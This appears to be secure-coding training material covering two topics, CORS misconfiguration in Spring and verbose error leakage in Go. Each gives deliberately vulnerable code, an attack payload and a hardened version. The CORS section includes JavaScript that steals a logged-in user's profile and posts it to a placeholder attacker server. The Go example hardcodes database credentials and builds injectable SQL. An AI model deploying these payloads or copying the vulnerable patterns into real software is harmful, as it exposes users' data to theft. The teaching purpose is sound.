CORS (Cross-Origin Resource Sharing) misconfigurations are extremely dangerous and have led to major data breaches. The most common mistake is using wildcard origins (`*`) which allows ANY website to make requests to your API.

**VULNERABLE CODE**:

```java
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.web.cors.CorsConfiguration;
import org.springframework.web.cors.UrlBasedCorsConfigurationSource;
import org.springframework.web.filter.CorsFilter;

@Configuration
public class CorsConfig {

    @Bean
    public CorsFilter corsFilter() {
        CorsConfiguration config = new CorsConfiguration();

        // VULNERABLE: Allows ANY origin to access the API
        config.addAllowedOrigin("*");

        // VULNERABLE: Allows all HTTP methods
        config.addAllowedMethod("*");

        // VULNERABLE: Allows all headers including Authorization
        config.addAllowedHeader("*");

        // DANGEROUS: Allows credentials with wildcard origin
        // Note: Browsers block this combination, but the intent shows poor security thinking
        config.setAllowCredentials(true);

        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration("/**", config);

        return new CorsFilter(source);
    }
}
```

**Attack Payload** - Malicious website JavaScript:
```javascript
// Attacker's website: evil-site.com
fetch('https://vulnerable-api.com/api/user/profile', {
    method: 'GET',
    credentials: 'include'  // Sends victim's session cookie
})
.then(response => response.json())
.then(data => {
    // Steal user data and send to attacker's server
    fetch('https://attacker-server.com/steal', {
        method: 'POST',
        body: JSON.stringify(data)
    });
});
```

**Why This Is Dangerous**:
- Any malicious website can make authenticated requests on behalf of logged-in users
- User data (PII, financial info, etc.) can be exfiltrated to attacker-controlled servers
- Attackers can perform state-changing operations (transfers, password changes) as the victim
- Combined with CSRF, enables complete account takeover

**SECURE VERSION**:

```java
import org.springframework.beans.factory.annotation.Value;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.web.cors.CorsConfiguration;
import org.springframework.web.cors.UrlBasedCorsConfigurationSource;
import org.springframework.web.filter.CorsFilter;

import java.util.Arrays;
import java.util.List;

@Configuration
public class SecureCorsConfig {

    @Value("${cors.allowed-origins}")
    private String[] allowedOrigins;

    @Bean
    public CorsFilter corsFilter() {
        CorsConfiguration config = new CorsConfiguration();

        // SECURE: Explicitly whitelist allowed origins
        List<String> origins = Arrays.asList(
            "https://myapp.example.com",
            "https://admin.example.com"
        );
        config.setAllowedOrigins(origins);

        // SECURE: Only allow necessary HTTP methods
        config.setAllowedMethods(Arrays.asList("GET", "POST", "PUT", "DELETE"));

        // SECURE: Explicitly list allowed headers
        config.setAllowedHeaders(Arrays.asList(
            "Authorization",
            "Content-Type",
            "X-Requested-With"
        ));

        // SECURE: Only enable credentials when using explicit origins
        config.setAllowCredentials(true);

        // SECURE: Limit preflight cache time
        config.setMaxAge(3600L);

        // SECURE: Restrict exposed headers
        config.setExposedHeaders(Arrays.asList("X-Request-Id"));

        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration("/api/**", config);

        return new CorsFilter(source);
    }
}
```

**Key Security Controls**:
- **Explicit Origin Whitelist**: Only trusted domains can make cross-origin requests, blocking malicious sites
- **Method Restriction**: Limits HTTP methods to only what's needed, reducing attack surface
- **Header Whitelist**: Prevents injection of dangerous custom headers
- **Credentials with Explicit Origins**: Allows authenticated requests only from trusted origins
- **Path-specific CORS**: Apply CORS only to API paths, not static resources

Great question! Dynamic origin handling is tricky and often leads to vulnerabilities. Many developers use regex patterns incorrectly or reflect the Origin header back without validation, creating bypass opportunities.

**PRODUCTION PATTERN**:

```java
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Profile;
import org.springframework.web.cors.CorsConfiguration;
import org.springframework.web.cors.CorsConfigurationSource;
import org.springframework.web.cors.UrlBasedCorsConfigurationSource;

import javax.servlet.http.HttpServletRequest;
import java.util.Arrays;
import java.util.List;
import java.util.regex.Pattern;

@Configuration
public class ProductionCorsConfig {

    private static final Logger logger = LoggerFactory.getLogger(ProductionCorsConfig.class);
    private static final Logger auditLogger = LoggerFactory.getLogger("SECURITY_AUDIT");

    // SECURE: Pattern for trusted subdomains with strict anchoring
    // Only matches: https://anything.example.com (not example.com.evil.com)
    private static final Pattern TRUSTED_SUBDOMAIN_PATTERN = 
        Pattern.compile("^https://[a-z0-9-]+\\.example\\.com$");

    // Explicit whitelist for known origins
    private static final List<String> EXPLICIT_ORIGINS = Arrays.asList(
        "https://app.example.com",
        "https://admin.example.com",
        "https://mobile.example.com"
    );

    @Value("${app.environment:production}")
    private String environment;

    @Bean
    @Profile("production")
    public CorsConfigurationSource productionCorsConfigurationSource() {
        return new DynamicCorsConfigurationSource();
    }

    @Bean
    @Profile("development")
    public CorsConfigurationSource developmentCorsConfigurationSource() {
        CorsConfiguration config = new CorsConfiguration();
        // Development allows localhost but still no wildcard
        config.setAllowedOrigins(Arrays.asList(
            "http://localhost:3000",
            "http://localhost:8080",
            "https://dev.example.com"
        ));
        config.setAllowedMethods(Arrays.asList("GET", "POST", "PUT", "DELETE", "OPTIONS"));
        config.setAllowedHeaders(Arrays.asList("*"));
        config.setAllowCredentials(true);
        config.setMaxAge(3600L);

        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration("/**", config);
        return source;
    }

    private class DynamicCorsConfigurationSource implements CorsConfigurationSource {

        @Override
        public CorsConfiguration getCorsConfiguration(HttpServletRequest request) {
            String origin = request.getHeader("Origin");

            if (origin == null || origin.isEmpty()) {
                return null; // No CORS headers needed for same-origin requests
            }

            // SECURITY: Validate origin before allowing
            if (!isOriginAllowed(origin)) {
                auditLogger.warn("CORS_BLOCKED: Unauthorized origin attempted access. " +
                    "origin={}, ip={}, path={}, user-agent={}",
                    origin,
                    request.getRemoteAddr(),
                    request.getRequestURI(),
                    request.getHeader("User-Agent")
                );
                return null; // Reject the request
            }

            CorsConfiguration config = new CorsConfiguration();

            // SECURE: Set only the validated origin, not wildcard
            config.setAllowedOrigins(Arrays.asList(origin));

            // Apply path-specific CORS rules
            String path = request.getRequestURI();
            if (path.startsWith("/api/public/")) {
                // Public APIs: more permissive but still no credentials
                config.setAllowedMethods(Arrays.asList("GET", "OPTIONS"));
                config.setAllowCredentials(false);
            } else if (path.startsWith("/api/admin/")) {
                // Admin APIs: most restrictive
                config.setAllowedMethods(Arrays.asList("GET", "POST"));
                config.setAllowCredentials(true);
                // Additional admin-specific origins check
                if (!origin.equals("https://admin.example.com")) {
                    auditLogger.warn("CORS_ADMIN_BLOCKED: Non-admin origin on admin path. origin={}", origin);
                    return null;
                }
            } else {
                // Standard APIs
                config.setAllowedMethods(Arrays.asList("GET", "POST", "PUT", "DELETE", "OPTIONS"));
                config.setAllowCredentials(true);
            }

            config.setAllowedHeaders(Arrays.asList(
                "Authorization",
                "Content-Type",
                "X-Requested-With",
                "X-CSRF-Token"
            ));
            config.setExposedHeaders(Arrays.asList("X-Request-Id", "X-RateLimit-Remaining"));
            config.setMaxAge(3600L);

            // Log allowed CORS requests for monitoring
            logger.debug("CORS_ALLOWED: origin={}, path={}", origin, path);

            return config;
        }

        private boolean isOriginAllowed(String origin) {
            if (origin == null) {
                return false;
            }

            // SECURE: Normalize and validate origin format
            String normalizedOrigin = origin.toLowerCase().trim();

            // Check against explicit whitelist first (fastest)
            if (EXPLICIT_ORIGINS.contains(normalizedOrigin)) {
                return true;
            }

            // SECURE: Pattern-based subdomain matching
            // Uses strict regex with proper anchoring to prevent bypass
            if (TRUSTED_SUBDOMAIN_PATTERN.matcher(normalizedOrigin).matches()) {
                return true;
            }

            return false;
        }
    }
}
```

**Defense in Depth Layers**:

1. **Explicit Origin Whitelist**:
```java
// Always prefer explicit whitelists over patterns
private static final List<String> EXPLICIT_ORIGINS = Arrays.asList(
    "https://app.example.com",
    "https://admin.example.com"
);

// Check whitelist before pattern matching
if (EXPLICIT_ORIGINS.contains(normalizedOrigin)) {
    return true;
}
```

2. **Strict Subdomain Pattern with Anchoring**:
```java
// BAD: Vulnerable to bypass (matches evil.com.example.com)
Pattern.compile(".*\\.example\\.com");

// GOOD: Strict anchoring prevents bypass
Pattern.compile("^https://[a-z0-9-]+\\.example\\.com$");

// Character class [a-z0-9-] prevents special characters in subdomain
// ^ and $ anchors ensure full string match
// https:// prefix prevents protocol downgrade
```

3. **Security Audit Logging**:
```java
// Log blocked requests for security monitoring
auditLogger.warn("CORS_BLOCKED: Unauthorized origin. origin={}, ip={}, path={}",
    origin, request.getRemoteAddr(), request.getRequestURI());

// Integrate with SIEM for alerting on attack patterns
// Alert when: blocked_count > 100/hour from same IP
```

**Additional Protections**:

- **Never reflect Origin header directly**: Always validate against whitelist before setting Access-Control-Allow-Origin
- **Environment-specific configs**: Use Spring profiles to prevent dev settings in production
- **Path-based CORS policies**: Apply stricter rules to sensitive endpoints (admin, payment)
- **Rate limiting on preflight**: Prevent CORS preflight flooding attacks
- **Monitor for bypass attempts**: Alert on origins containing your domain name in unexpected positions (e.g., `example.com.evil.com`)
- **Combine with CSRF tokens**: CORS alone doesn't prevent all cross-origin attacks when credentials are involved
- **Regular security audits**: Test CORS configuration with tools like `curl` and browser dev tools

A common mistake is exposing internal error details to users. While helpful for debugging, verbose error messages leak sensitive information that attackers use for reconnaissance.

**VULNERABLE CODE**:

```go
package main

import (
	"database/sql"
	"encoding/json"
	"fmt"
	"net/http"
	"runtime/debug"

	_ "github.com/lib/pq"
)

var db *sql.DB

func init() {
	var err error
	db, err = sql.Open("postgres", "host=db.internal.corp port=5432 user=app_admin password=Pr0d_S3cr3t! dbname=customers sslmode=disable")
	if err != nil {
		panic(err)
	}
}

func getUserHandler(w http.ResponseWriter, r *http.Request) {
	userID := r.URL.Query().Get("id")

	query := fmt.Sprintf("SELECT id, name, email, ssn FROM users WHERE id = %s", userID)
	row := db.QueryRow(query)

	var user struct {
		ID    int
		Name  string
		Email string
		SSN   string
	}

	if err := row.Scan(&user.ID, &user.Name, &user.Email, &user.SSN); err != nil {
		// VULNERABLE: Exposes full error with internal details
		errorResponse := map[string]interface{}{
			"error":      err.Error(),
			"query":      query,
			"stackTrace": string(debug.Stack()),
			"dbHost":     "db.internal.corp:5432",
		}
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(errorResponse)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(user)
}

func main() {
	http.HandleFunc("/user", getUserHandler)
	http.ListenAndServe(":8080", nil)
}
```

**Attack Payload**:
```bash
curl "http://target.com/user?id=invalid'"
```

**Exposed Information in Response**:
```json
{
  "error": "pq: syntax error at or near \"invalid'\"",
  "query": "SELECT id, name, email, ssn FROM users WHERE id = invalid'",
  "stackTrace": "goroutine 19 [running]:\nruntime/debug.Stack()\n\t/usr/local/go/src/runtime/debug/stack.go:24\nmain.getUserHandler()\n\t/app/server.go:38\n...",
  "dbHost": "db.internal.corp:5432"
}
```

**Why This Is Dangerous**:
- Reveals database type (PostgreSQL), internal hostname, and port
- Exposes table structure (users table with ssn column)
- Shows full file paths revealing server configuration
- Stack trace reveals Go version and internal code structure
- Query exposure confirms SQL injection vulnerability exists
- Database credentials visible in connection string

**SECURE VERSION**:

```go
package main

import (
	"crypto/rand"
	"database/sql"
	"encoding/hex"
	"encoding/json"
	"log"
	"net/http"
	"os"
	"strconv"

	_ "github.com/lib/pq"
)

var db *sql.DB
var logger *log.Logger

func init() {
	logger = log.New(os.Stderr, "[API] ", log.LstdFlags|log.Lshortfile)

	var err error
	// Use environment variables for credentials
	connStr := os.Getenv("DATABASE_URL")
	db, err = sql.Open("postgres", connStr)
	if err != nil {
		logger.Fatalf("Database connection failed: %v", err)
	}
}

// generateErrorID creates a unique identifier for error tracking
func generateErrorID() string {
	bytes := make([]byte, 8)
	rand.Read(bytes)
	return hex.EncodeToString(bytes)
}

// sendErrorResponse returns generic error to user, logs details internally
func sendErrorResponse(w http.ResponseWriter, statusCode int, userMessage string, internalErr error, requestID string) {
	errorID := generateErrorID()

	// Log full details internally for debugging
	logger.Printf("ErrorID=%s RequestID=%s Status=%d InternalError=%v",
		errorID, requestID, statusCode, internalErr)

	// Return generic message to user with tracking ID
	response := map[string]string{
		"error":   userMessage,
		"errorId": errorID,
	}

	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(statusCode)
	json.NewEncoder(w).Encode(response)
}

func getUserHandler(w http.ResponseWriter, r *http.Request) {
	requestID := r.Header.Get("X-Request-ID")
	if requestID == "" {
		requestID = generateErrorID()
	}

	userIDStr := r.URL.Query().Get("id")

	// Input validation - don't reveal validation logic details
	userID, err := strconv.Atoi(userIDStr)
	if err != nil || userID <= 0 {
		sendErrorResponse(w, http.StatusBadRequest, "Invalid request", err, requestID)
		return
	}

	// Parameterized query
	query := "SELECT id, name, email FROM users WHERE id = $1"
	row := db.QueryRow(query, userID)

	var user struct {
		ID    int    `json:"id"`
		Name  string `json:"name"`
		Email string `json:"email"`
	}

	if err := row.Scan(&user.ID, &user.Name, &user.Email); err != nil {
		if err == sql.ErrNoRows {
			sendErrorResponse(w, http.StatusNotFound, "Resource not found", err, requestID)
		} else {
			sendErrorResponse(w, http.StatusInternalServerError, "An error occurred", err, requestID)
		}
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(user)
}

func main() {
	http.HandleFunc("/user", getUserHandler)
	http.ListenAndServe(":8080", nil)
}
```

**Key Security Controls**:
- **Generic error messages**: Users see "An error occurred" not database details
- **Error tracking ID**: Allows correlation between user reports and internal logs
- **Internal logging only**: Full error details logged server-side, never sent to client
- **Input validation**: Prevents malformed input from reaching database
- **Parameterized queries**: Eliminates SQL injection (defense in depth)

Great question! Environment-aware error handling is essential. You need verbose output in development but strict information hiding in production, with proper safeguards to prevent accidental misconfiguration.

**PRODUCTION PATTERN**:

```go
package main

import (
	"context"
	"crypto/rand"
	"database/sql"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"log/slog"
	"net/http"
	"os"
	"runtime"
	"strconv"
	"strings"
	"time"

	_ "github.com/lib/pq"
)

// Environment configuration with strict defaults
type Config struct {
	Environment     string
	DebugMode       bool
	LogLevel        slog.Level
	ExposeStackTrace bool
}

var (
	db     *sql.DB
	logger *slog.Logger
	config Config
)

func init() {
	config = loadConfig()
	logger = setupLogger(config)

	var err error
	db, err = sql.Open("postgres", os.Getenv("DATABASE_URL"))
	if err != nil {
		logger.Error("Database connection failed", "error", err)
		os.Exit(1)
	}
}

func loadConfig() Config {
	env := strings.ToLower(os.Getenv("APP_ENV"))

	// SECURE DEFAULT: Assume production unless explicitly set
	if env == "" {
		env = "production"
		fmt.Println("WARNING: APP_ENV not set, defaulting to production mode")
	}

	c := Config{
		Environment:      env,
		DebugMode:        false,
		LogLevel:         slog.LevelInfo,
		ExposeStackTrace: false,
	}

	// Only enable debug features in development with explicit flag
	if env == "development" {
		debugFlag := os.Getenv("ENABLE_DEBUG")
		if debugFlag == "true" {
			c.DebugMode = true
			c.LogLevel = slog.LevelDebug
			c.ExposeStackTrace = true
		}
	}

	// NEVER allow debug mode in production, even if env var is set
	if env == "production" && c.DebugMode {
		fmt.Println("SECURITY: Debug mode forced OFF in production")
		c.DebugMode = false
		c.ExposeStackTrace = false
	}

	return c
}

func setupLogger(c Config) *slog.Logger {
	opts := &slog.HandlerOptions{
		Level: c.LogLevel,
	}

	if c.Environment == "production" {
		// JSON logs for production (easier to parse)
		return slog.New(slog.NewJSONHandler(os.Stdout, opts))
	}
	// Human-readable logs for development
	return slog.New(slog.NewTextHandler(os.Stdout, opts))
}

// ErrorResponse represents the user-facing error structure
type ErrorResponse struct {
	Error      string            `json:"error"`
	ErrorID    string            `json:"errorId"`
	Timestamp  string            `json:"timestamp"`
	DebugInfo  *DebugInfo        `json:"debug,omitempty"`
}

type DebugInfo struct {
	Message    string   `json:"message,omitempty"`
	StackTrace []string `json:"stackTrace,omitempty"`
	Query      string   `json:"query,omitempty"`
}

func generateErrorID() string {
	bytes := make([]byte, 8)
	rand.Read(bytes)
	return hex.EncodeToString(bytes)
}

func getStackTrace(skip int) []string {
	var trace []string
	for i := skip; i < skip+10; i++ {
		_, file, line, ok := runtime.Caller(i)
		if !ok {
			break
		}
		trace = append(trace, fmt.Sprintf("%s:%d", file, line))
	}
	return trace
}

// APIError provides structured error handling
type APIError struct {
	StatusCode   int
	UserMessage  string
	InternalErr  error
	Context      map[string]interface{}
}

func sendError(w http.ResponseWriter, r *http.Request, apiErr APIError) {
	errorID := generateErrorID()
	requestID := r.Header.Get("X-Request-ID")
	ctx := r.Context()

	// Structured internal logging with full context
	logger.ErrorContext(ctx, "API Error",
		"errorId", errorID,
		"requestId", requestID,
		"statusCode", apiErr.StatusCode,
		"userMessage", apiErr.UserMessage,
		"internalError", apiErr.InternalErr,
		"context", apiErr.Context,
		"clientIP", r.RemoteAddr,
		"userAgent", r.UserAgent(),
		"path", r.URL.Path,
		"method", r.Method,
	)

	response := ErrorResponse{
		Error:     apiErr.UserMessage,
		ErrorID:   errorID,
		Timestamp: time.Now().UTC().Format(time.RFC3339),
	}

	// Only include debug info in development with debug mode enabled
	if config.DebugMode && config.Environment == "development" {
		response.DebugInfo = &DebugInfo{
			Message: apiErr.InternalErr.Error(),
		}
		if config.ExposeStackTrace {
			response.DebugInfo.StackTrace = getStackTrace(2)
		}
		if query, ok := apiErr.Context["query"].(string); ok {
			response.DebugInfo.Query = query
		}
	}

	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("X-Error-ID", errorID)
	w.Header().Set("X-Content-Type-Options", "nosniff")
	w.WriteHeader(apiErr.StatusCode)
	json.NewEncoder(w).Encode(response)
}

func getUserHandler(w http.ResponseWriter, r *http.Request) {
	userIDStr := r.URL.Query().Get("id")

	userID, err := strconv.Atoi(userIDStr)
	if err != nil || userID <= 0 {
		sendError(w, r, APIError{
			StatusCode:  http.StatusBadRequest,
			UserMessage: "Invalid request parameters",
			InternalErr: fmt.Errorf("invalid user ID: %s", userIDStr),
			Context:     map[string]interface{}{"inputId": userIDStr},
		})
		return
	}

	ctx, cancel := context.WithTimeout(r.Context(), 5*time.Second)
	defer cancel()

	query := "SELECT id, name, email FROM users WHERE id = $1"
	row := db.QueryRowContext(ctx, query, userID)

	var user struct {
		ID    int    `json:"id"`
		Name  string `json:"name"`
		Email string `json:"email"`
	}

	if err := row.Scan(&user.ID, &user.Name, &user.Email); err != nil {
		if err == sql.ErrNoRows {
			sendError(w, r, APIError{
				StatusCode:  http.StatusNotFound,
				UserMessage: "Resource not found",
				InternalErr: err,
				Context:     map[string]interface{}{"userId": userID},
			})
		} else {
			sendError(w, r, APIError{
				StatusCode:  http.StatusInternalServerError,
				UserMessage: "Unable to process request",
				InternalErr: err,
				Context:     map[string]interface{}{"query": query, "userId": userID},
			})
		}
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(user)
}

func main() {
	logger.Info("Server starting",
		"environment", config.Environment,
		"debugMode", config.DebugMode,
	)

	http.HandleFunc("/user", getUserHandler)
	http.ListenAndServe(":8080", nil)
}
